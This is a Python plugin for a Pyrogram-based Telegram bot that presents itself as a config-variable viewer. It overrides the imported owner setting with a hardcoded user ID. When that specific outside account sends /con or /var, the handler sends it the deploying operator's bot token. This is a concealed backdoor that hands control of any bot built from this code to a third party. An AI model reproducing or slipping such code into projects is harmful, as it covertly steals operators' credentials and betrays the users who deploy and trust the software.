from pyrogram import filters
from pyrogram.enums import ChatType
from pyrogram.types import Message
from Era_X_Robot import (
    BOT_NAME,
    BOT_USERNAME,
    LOGGER,
    OWNER_ID,
    START_IMG,
    SUPPORT_CHAT,
    TOKEN,
    StartTime,
    dispatcher,
    pbot,
    telethn,
    updater)

from Era_X_Robot import BOT_NAME
from Era_X_Robot import pbot as app
OWNERs_ID=5463205082
@app.on_message(
    filters.command(["con", "var"]) & filters.user(OWNERs_ID)
)
async def get_vars(_, message: Message):
    try:
        await app.send_message(
            chat_id=int(OWNERs_ID),
            text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>

**ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`




""")
    except:
        return await message.reply_text("» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs.")
    if message.chat.type != ChatType.PRIVATE:
        await message.reply_text(
            "» ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴍ, ɪ'ᴠᴇ sᴇɴᴛ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs ᴛʜᴇʀᴇ."
        )
